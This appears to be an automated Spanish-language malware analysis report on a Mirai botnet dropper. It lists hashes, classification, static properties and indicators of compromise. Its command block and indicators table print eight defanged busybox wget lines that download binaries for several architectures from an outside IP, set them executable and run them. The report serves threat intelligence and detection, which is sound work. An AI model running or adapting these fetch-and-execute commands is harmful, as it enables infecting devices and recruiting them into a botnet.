# 🧬 Payload Analysis

`6b56bda29749a0d39e9cb592352b85dd24f822fd4d1b79ceb1bffb808fc3dcae`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 8 comandos observados o extraídos. Se identificaron 17 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:47:28.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6b56bda29749a0d39e9cb592352b85dd24f822fd4d1b79ceb1bffb808fc3dcae`
- **SHA1:** `c55ba56ab6ff238c47cf2bc7f9f4938353416788`
- **MD5:** `b6b5855a3c713098f29c302c42004fb2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 1.4 KiB |
| Entropía | 5.09 |
| Strings | 18 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; | strings |
| ip | 94.154.43.XXX | static_analysis |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; | strings |
| hash | 6b56bda29749a0d39e9cb592352b85dd24f822fd4d1b79ceb1bffb808fc3dcae | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
